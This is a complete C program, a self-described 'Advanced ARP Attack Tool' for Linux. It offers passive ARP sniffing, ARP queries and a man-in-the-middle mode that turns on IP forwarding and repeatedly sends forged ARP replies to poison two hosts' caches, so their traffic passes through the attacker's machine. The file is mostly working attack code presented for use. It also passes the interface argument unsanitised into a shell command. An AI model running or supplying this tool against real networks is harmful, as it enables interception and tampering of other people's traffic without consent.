#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <signal.h>

#pragma pack(push, 1)
struct eth_header {
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t ethertype;
};

struct arp_header {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_len;
    uint8_t protocol_len;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
};
#pragma pack(pop)

struct arp_cache_entry {
    uint8_t ip[4];
    uint8_t mac[6];
    time_t timestamp;
    int state;
    struct arp_cache_entry *next;
};

struct attack_config {
    char interface[16];
    uint8_t attacker_mac[6];
    uint8_t attacker_ip[4];
    uint8_t target1_ip[4];
    uint8_t target2_ip[4];
    uint8_t gateway_ip[4];
    int attack_type;
    int running;
};

struct arp_cache_entry *arp_cache = NULL;
struct attack_config global_config;

void arp_cache_add(uint8_t *ip, uint8_t *mac, int state) {
    struct arp_cache_entry *entry = malloc(sizeof(struct arp_cache_entry));
    if (!entry) {
        perror("malloc");
        return;
    }
    
    memcpy(entry->ip, ip, 4);
    memcpy(entry->mac, mac, 6);
    entry->timestamp = time(NULL);
    entry->state = state;
    entry->next = arp_cache;
    arp_cache = entry;
    
    printf("ARP Cache: %d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X\n",
           ip[0], ip[1], ip[2], ip[3],
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

uint8_t* arp_cache_lookup(uint8_t *ip) {
    struct arp_cache_entry *current = arp_cache;
    while (current != NULL) {
        if (memcmp(current->ip, ip, 4) == 0) {
            if (time(NULL) - current->timestamp > 300) {
                current->state = 2;
            }
            if (current->state != 0) {
                return current->mac;
            }
        }
        current = current->next;
    }
    return NULL;
}

void arp_cache_cleanup() {
    struct arp_cache_entry **current = &arp_cache;
    while (*current != NULL) {
        if (time(NULL) - (*current)->timestamp > 300) {
            struct arp_cache_entry *to_free = *current;
            *current = (*current)->next;
            free(to_free);
        } else {
            current = &(*current)->next;
        }
    }
}

void print_arp_cache() {
    printf("\n=== ARP Cache ===\n");
    struct arp_cache_entry *current = arp_cache;
    while (current != NULL) {
        printf("%d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X (state: %d, age: %lds)\n",
               current->ip[0], current->ip[1], current->ip[2], current->ip[3],
               current->mac[0], current->mac[1], current->mac[2],
               current->mac[3], current->mac[4], current->mac[5],
               current->state, time(NULL) - current->timestamp);
        current = current->next;
    }
    printf("=================\n\n");
}

void create_arp_request(uint8_t *packet, uint8_t *src_mac, uint8_t *src_ip, uint8_t *target_ip) {
    struct eth_header *eth = (struct eth_header *)packet;
    struct arp_header *arp = (struct arp_header *)(packet + sizeof(struct eth_header));
    
    memset(eth->dest_mac, 0xFF, 6);
    memcpy(eth->src_mac, src_mac, 6);
    eth->ethertype = htons(ETH_P_ARP);
    
    arp->hardware_type = htons(ARPHRD_ETHER);
    arp->protocol_type = htons(ETH_P_IP);
    arp->hardware_len = 6;
    arp->protocol_len = 4;
    arp->opcode = htons(ARPOP_REQUEST);
    
    memcpy(arp->sender_mac, src_mac, 6);
    memcpy(arp->sender_ip, src_ip, 4);
    memset(arp->target_mac, 0, 6);
    memcpy(arp->target_ip, target_ip, 4);
}

void create_arp_reply(uint8_t *packet, uint8_t *src_mac, uint8_t *src_ip, 
                     uint8_t *target_mac, uint8_t *target_ip) {
    struct eth_header *eth = (struct eth_header *)packet;
    struct arp_header *arp = (struct arp_header *)(packet + sizeof(struct eth_header));
    
    memcpy(eth->dest_mac, target_mac, 6);
    memcpy(eth->src_mac, src_mac, 6);
    eth->ethertype = htons(ETH_P_ARP);
    
    arp->hardware_type = htons(ARPHRD_ETHER);
    arp->protocol_type = htons(ETH_P_IP);
    arp->hardware_len = 6;
    arp->protocol_len = 4;
    arp->opcode = htons(ARPOP_REPLY);
    
    memcpy(arp->sender_mac, src_mac, 6);
    memcpy(arp->sender_ip, src_ip, 4);
    memcpy(arp->target_mac, target_mac, 6);
    memcpy(arp->target_ip, target_ip, 4);
}

int send_arp_packet(int sockfd, uint8_t *packet, const char *iface) {
    struct sockaddr_ll socket_addr;
    struct ifreq if_idx;
    
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, iface, IFNAMSIZ-1);
    if_idx.ifr_name[IFNAMSIZ-1] = '\0';
    
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        return -1;
    }
    
    memset(&socket_addr, 0, sizeof(struct sockaddr_ll));
    socket_addr.sll_family = AF_PACKET;
    socket_addr.sll_protocol = htons(ETH_P_ARP);
    socket_addr.sll_ifindex = if_idx.ifr_ifindex;
    socket_addr.sll_halen = ETH_ALEN;
    
    struct eth_header *eth = (struct eth_header *)packet;
    memcpy(socket_addr.sll_addr, eth->dest_mac, 6);
    
    ssize_t sent = sendto(sockfd, packet, sizeof(struct eth_header) + sizeof(struct arp_header),
                     0, (struct sockaddr*)&socket_addr, sizeof(struct sockaddr_ll));
    
    if (sent < 0) {
        perror("sendto");
        return -1;
    }
    
    return (int)sent;
}

int init_raw_socket(const char *interface) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';
    
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
        perror("SO_BINDTODEVICE");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    return sockfd;
}

void get_interface_mac(const char *interface, uint8_t *mac) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';
    
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("SIOCGIFHWADDR");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sockfd);
}

void get_interface_ip(const char *interface, uint8_t *ip) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';
    
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("SIOCGIFADDR");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy(ip, &ip_addr->sin_addr.s_addr, 4);
    close(sockfd);
}

void get_default_gateway(const char *interface, uint8_t *gateway) {
    char command[256];
    char gateway_str[16];
    
    snprintf(command, sizeof(command), "ip route show dev %s | awk '/default/ {print $3}'", interface);
    
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        perror("popen");
        return;
    }
    
    if (fgets(gateway_str, sizeof(gateway_str), fp) != NULL) {
        gateway_str[strcspn(gateway_str, "\n")] = 0;
        if (inet_pton(AF_INET, gateway_str, gateway) != 1) {
            printf("Failed to parse gateway IP\n");
        }
    }
    
    pclose(fp);
}

void signal_handler(int sig) {
    printf("\n[!] Received signal %d, shutting down...\n", sig);
    global_config.running = 0;
    
    system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");
    
    struct arp_cache_entry *current = arp_cache;
    while (current != NULL) {
        struct arp_cache_entry *next = current->next;
        free(current);
        current = next;
    }
    arp_cache = NULL;
    
    exit(0);
}

void mitm_attack(struct attack_config *config) {
    int sockfd = init_raw_socket(config->interface);
    uint8_t packet[sizeof(struct eth_header) + sizeof(struct arp_header)];
    
    printf("[+] Starting MITM ARP spoofing attack\n");
    printf("[+] Interface: %s\n", config->interface);
    printf("[+] Attacker MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
           config->attacker_mac[0], config->attacker_mac[1], config->attacker_mac[2],
           config->attacker_mac[3], config->attacker_mac[4], config->attacker_mac[5]);
    printf("[+] Target 1: %d.%d.%d.%d\n", 
           config->target1_ip[0], config->target1_ip[1], config->target1_ip[2], config->target1_ip[3]);
    printf("[+] Target 2: %d.%d.%d.%d\n", 
           config->target2_ip[0], config->target2_ip[1], config->target2_ip[2], config->target2_ip[3]);
    
    system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null");
    printf("[+] IP forwarding enabled\n");
    
    printf("[+] MITM attack running... Press Ctrl+C to stop\n");
    
    int packet_count = 0;
    config->running = 1;
    
    while (config->running) {
        create_arp_reply(packet, config->attacker_mac, config->target2_ip, 
                        config->attacker_mac, config->target1_ip);
        
        if (send_arp_packet(sockfd, packet, config->interface) > 0) {
            printf("[Poison] Told %d.%d.%d.%d that %d.%d.%d.%d is at attacker MAC\n",
                   config->target1_ip[0], config->target1_ip[1], config->target1_ip[2], config->target1_ip[3],
                   config->target2_ip[0], config->target2_ip[1], config->target2_ip[2], config->target2_ip[3]);
        }
        
        create_arp_reply(packet, config->attacker_mac, config->target1_ip, 
                        config->attacker_mac, config->target2_ip);
        
        if (send_arp_packet(sockfd, packet, config->interface) > 0) {
            printf("[Poison] Told %d.%d.%d.%d that %d.%d.%d.%d is at attacker MAC\n",
                   config->target2_ip[0], config->target2_ip[1], config->target2_ip[2], config->target2_ip[3],
                   config->target1_ip[0], config->target1_ip[1], config->target1_ip[2], config->target1_ip[3]);
        }
        
        packet_count += 2;
        
        if (packet_count % 10 == 0) {
            printf("[Stats] Sent %d ARP poison packets\n", packet_count);
            print_arp_cache();
        }
        
        sleep(5);
    }
    
    close(sockfd);
}

void passive_arp_sniffing(struct attack_config *config) {
    int sockfd = init_raw_socket(config->interface);
    uint8_t buffer[65536];
    
    printf("[+] Starting passive ARP sniffing\n");
    printf("[+] Interface: %s\n", config->interface);
    printf("[+] Attacker MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
           config->attacker_mac[0], config->attacker_mac[1], config->attacker_mac[2],
           config->attacker_mac[3], config->attacker_mac[4], config->attacker_mac[5]);
    printf("[+] Listening for ARP traffic... Press Ctrl+C to stop\n");
    
    int packet_count = 0;
    config->running = 1;
    
    while (config->running) {
        ssize_t packet_size = recv(sockfd, buffer, sizeof(buffer), 0);
        if (packet_size < 0) {
            perror("recv");
            continue;
        }
        
        if ((size_t)packet_size < sizeof(struct eth_header)) {
            continue;
        }
        
        struct eth_header *eth = (struct eth_header *)buffer;
        
        if (ntohs(eth->ethertype) == ETH_P_ARP && 
            (size_t)packet_size >= sizeof(struct eth_header) + sizeof(struct arp_header)) {
            
            struct arp_header *arp = (struct arp_header *)(buffer + sizeof(struct eth_header));
            
            if (ntohs(arp->opcode) == ARPOP_REQUEST) {
                printf("[ARP Request] Who has %d.%d.%d.%d? Tell %d.%d.%d.%d (%02X:%02X:%02X:%02X:%02X:%02X)\n",
                       arp->target_ip[0], arp->target_ip[1], arp->target_ip[2], arp->target_ip[3],
                       arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3],
                       arp->sender_mac[0], arp->sender_mac[1], arp->sender_mac[2],
                       arp->sender_mac[3], arp->sender_mac[4], arp->sender_mac[5]);
                
                arp_cache_add(arp->sender_ip, arp->sender_mac, 1);
                
            } else if (ntohs(arp->opcode) == ARPOP_REPLY) {
                printf("[ARP Reply] %d.%d.%d.%d is at %02X:%02X:%02X:%02X:%02X:%02X\n",
                       arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3],
                       arp->sender_mac[0], arp->sender_mac[1], arp->sender_mac[2],
                       arp->sender_mac[3], arp->sender_mac[4], arp->sender_mac[5]);
                
                arp_cache_add(arp->sender_ip, arp->sender_mac, 1);
            }
            
            packet_count++;
        }
        
        if (packet_count % 50 == 0) {
            arp_cache_cleanup();
            print_arp_cache();
        }
    }
    
    close(sockfd);
}

void send_arp_query(struct attack_config *config, uint8_t *target_ip) {
    int sockfd = init_raw_socket(config->interface);
    uint8_t packet[sizeof(struct eth_header) + sizeof(struct arp_header)];
    
    create_arp_request(packet, config->attacker_mac, config->attacker_ip, target_ip);
    
    if (send_arp_packet(sockfd, packet, config->interface) > 0) {
        printf("[Query] Asked for MAC of %d.%d.%d.%d\n",
               target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    }
    
    close(sockfd);
}

int main(int argc, char *argv[]) {
    printf("=== Advanced ARP Attack Tool ===\n");
    
    if (argc < 2) {
        printf("Usage: %s <interface> [target1_ip] [target2_ip]\n", argv[0]);
        printf("Modes:\n");
        printf("  - Passive sniffing: %s eth0\n", argv[0]);
        printf("  - MITM attack: %s eth0 192.168.1.100 192.168.1.200\n", argv[0]);
        printf("  - ARP query: %s eth0 192.168.1.100\n", argv[0]);
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    struct attack_config config;
    strncpy(config.interface, argv[1], sizeof(config.interface)-1);
    config.interface[sizeof(config.interface)-1] = '\0';
    config.running = 1;
    
    get_interface_mac(config.interface, config.attacker_mac);
    get_interface_ip(config.interface, config.attacker_ip);
    get_default_gateway(config.interface, config.gateway_ip);
    
    printf("[+] Interface: %s\n", config.interface);
    printf("[+] Attacker IP: %d.%d.%d.%d\n", 
           config.attacker_ip[0], config.attacker_ip[1], config.attacker_ip[2], config.attacker_ip[3]);
    printf("[+] Gateway: %d.%d.%d.%d\n", 
           config.gateway_ip[0], config.gateway_ip[1], config.gateway_ip[2], config.gateway_ip[3]);
    
    if (argc == 2) {
        config.attack_type = 2;
        passive_arp_sniffing(&config);
    } else if (argc == 3) {
        uint8_t target_ip[4];
        if (inet_pton(AF_INET, argv[2], target_ip) != 1) {
            printf("Invalid IP address: %s\n", argv[2]);
            return 1;
        }
        send_arp_query(&config, target_ip);
        sleep(2);
    } else if (argc == 4) {
        config.attack_type = 0;
        
        if (inet_pton(AF_INET, argv[2], config.target1_ip) != 1 ||
            inet_pton(AF_INET, argv[3], config.target2_ip) != 1) {
            printf("Invalid IP addresses\n");
            return 1;
        }
        
        mitm_attack(&config);
    } else {
        printf("Invalid number of arguments\n");
        return 1;
    }
    
    return 0;
}